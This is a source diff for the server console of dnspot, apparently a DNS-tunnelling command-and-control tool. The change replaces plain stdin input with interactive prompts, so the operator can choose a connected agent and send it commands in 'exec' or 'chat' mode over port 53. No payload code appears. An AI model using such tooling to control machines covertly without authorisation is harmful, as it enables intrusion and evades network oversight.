@@ -5,13 +5,12 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"os"
 	"os/signal"
-	"strings"
 	"syscall"
 
+	"github.com/manifoldco/promptui"
 	"github.com/mosajjal/dnspot/cryptography"
 	"github.com/mosajjal/dnspot/server"
 	"github.com/rs/zerolog"
@@ -20,7 +19,7 @@ import (
 )
 
 type cmdIO struct {
-	in     chan string
+	in     chan server.InMsg
 	out    chan string
 	logger zerolog.Logger
 }
@@ -28,7 +27,7 @@ type cmdIO struct {
 func (io cmdIO) Logger(level uint8, format string, args ...interface{}) {
 	io.logger.WithLevel(zerolog.Level(level)).Msgf(format, args...)
 }
-func (io cmdIO) GetInputFeed() chan string {
+func (io cmdIO) GetInputFeed() chan server.InMsg {
 	return io.in
 }
 func (io cmdIO) GetOutputFeed() chan string {
@@ -37,19 +36,41 @@ func (io cmdIO) GetOutputFeed() chan string {
 
 func (io cmdIO) Handler() {
 
-	reader := bufio.NewReader(os.Stdin)
+	// reader := bufio.NewReader(os.Stdin)
 	fmt.Println("Press Ctrl+D to exit")
 	go func() {
 		for {
-			fmt.Print("-> ")
-			text, err := reader.ReadString('\n')
+
+			p1 := promptui.Prompt{
+				Label: "Command/Message",
+			}
+			text, err := p1.Run()
 			if err != nil {
 				os.Exit(0)
 			}
-			// convert CRLF to LF
-			text = strings.Replace(text, "\n", "", -1)
+			// fmt.Print("-> ")
+			// text, err := reader.ReadString('\n')
+			// if err != nil {
+			// 	os.Exit(0)
+			// }
+			// // convert CRLF to LF
+			// text = strings.Replace(text, "\n", "", -1)
+
+			agents := Server.ListAgents()
+			if len(agents) == 0 {
+				p1.Label = "No agents connected. Waiting for agents to connect"
+				_, _ = p1.Run()
+				continue
+			}
+			p2 := promptui.Select{
+				Label: "Agent",
+				Items: agents,
+			}
+
+			_, agent, _ := p2.Run()
+			// TODO: do this
 			if len(text) > 0 {
-				io.in <- text
+				io.in <- server.InMsg{Agent: agent, Prompt: text}
 			}
 		}
 	}()
@@ -61,11 +82,13 @@ func (io cmdIO) Handler() {
 	}
 }
 
+var Server server.Server
+
 func main() {
-	server := server.Server{}
+	Server = server.New()
 
 	var io cmdIO
-	io.in = make(chan string, 1)
+	io.in = make(chan server.InMsg, 1)
 	io.out = make(chan string, 1)
 	go io.Handler()
 
@@ -89,21 +112,21 @@ func main() {
 			} else {
 				io.logger = zerolog.New(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()
 			}
-			server.RunServer(io)
+			Server.RunServer(io)
 		},
 	}
 	cmdServer.Flags().String("logFile", "", "Log to file. stderr is used when not provided. Optional")
 	cmdServer.Flags().String("outFile", "", "Output File to record only the commands and their responses")
 	cmdServer.Flags().Uint8("logLevel", 1, "Log level. Panic:0, Fatal:1, Error:2, Warn:3, Info:4, Debug:5, Trace:6")
 
-	cmdServer.Flags().StringVarP(&server.PrivateKeyBase36, "privateKey", "", "", "Private Key used")
+	cmdServer.Flags().StringVarP(&Server.PrivateKeyBase36, "privateKey", "", "", "Private Key used")
 	_ = cmdServer.MarkFlagRequired("privateKey")
-	cmdServer.Flags().StringVarP(&server.ListenAddress, "listenAddress", "", "0.0.0.0:53", "Listen Socket")
-	cmdServer.Flags().BoolVarP(&server.EnforceClientKeys, "enforceClientKeys", "", false, "Enforce client keys. Need to provide a list of accepted public keys if set to true")
-	cmdServer.Flags().StringSliceVarP(&server.AcceptedClientKeysBase36, "acceptedClientKeys", "", []string{}, "Accepted Client Keys")
-	cmdServer.Flags().StringVarP(&server.DNSSuffix, "dnsSuffix", "", ".example.com.", "Subdomain that serves the domain, please note the dot at the beginning and the end")
+	cmdServer.Flags().StringVarP(&Server.ListenAddress, "listenAddress", "", "0.0.0.0:53", "Listen Socket")
+	cmdServer.Flags().BoolVarP(&Server.EnforceClientKeys, "enforceClientKeys", "", false, "Enforce client keys. Need to provide a list of accepted public keys if set to true")
+	cmdServer.Flags().StringSliceVarP(&Server.AcceptedClientKeysBase36, "acceptedClientKeys", "", []string{}, "Accepted Client Keys")
+	cmdServer.Flags().StringVarP(&Server.DNSSuffix, "dnsSuffix", "", ".example.com.", "Subdomain that serves the domain, please note the dot at the beginning and the end")
 	_ = cmdServer.MarkFlagRequired("dnsSuffix")
-	cmdServer.Flags().StringVarP(&server.Mode, "mode", "", "exec", "Run mode. choices: exec, chat")
+	cmdServer.Flags().StringVarP(&Server.Mode, "mode", "", "exec", "Run mode. choices: exec, chat")
 
 	// helper function to spit out keys
 	var cmdGenerateKey = &cobra.Command{
